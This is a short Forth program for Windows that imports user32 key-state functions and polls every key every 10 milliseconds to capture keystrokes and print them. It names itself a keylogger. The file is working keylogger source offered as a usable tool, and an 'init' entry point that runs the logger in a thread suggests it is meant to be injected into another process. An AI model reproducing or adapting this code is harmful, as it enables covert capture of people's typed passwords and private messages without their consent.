loadlib user32.dll
value user32

private

user32 1 dllfun GetKeyState GetKeyState
user32 2 dllfun MapVirtualKey MapVirtualKeyA
user32 3 dllfun GetKeyNameText GetKeyNameTextA
user32 5 dllfun ToAscii ToAscii

\ an array of bytes to store key states
\ (behaves like the lpKeyState parameter to the ToAscii function)
create keys 256 allot does> swap + ;

\ mark a key as pressed or unpressed
: setkey    -1 swap keys c! ;
: clrkey    0 swap keys c! ;

\ get state of key, test high bit
: pressed?  GetKeyState 15 >> 1 and if -1 else 0 then ; 

\ if the key was previously pressed, print its ASCII representation
: decode    dup 0 MapVirtualKey 0 keys here 0 ToAscii ;
: .nl?      13 = if 10 emit then ;
: .clamp    dup 32 < if +rev [char] ^ emit 64 + emit -rev else emit then ;
: .key      decode if here c@ dup .nl? .clamp then ;
: report?   dup keys c@ if drop else .key then ;

\ check if a key is pressed, and mark the state accordingly
: testkey   dup pressed? if dup report? setkey else clrkey then ;

\ test all the keys
: keymap    223 0 do i testkey loop ;

\ keylog for a little while
: flush     key? if key drop tail then ;
: quit?     key? if key [char] q = else 0 then ;
: keylog    quit? if cr .post else 10 ms keymap tail then ;

public{

: keylog    flush .pre keylog ;
: keylog!   10 ms keymap tail ;

}public

: init keylog 0 ExitThread ;
popinput

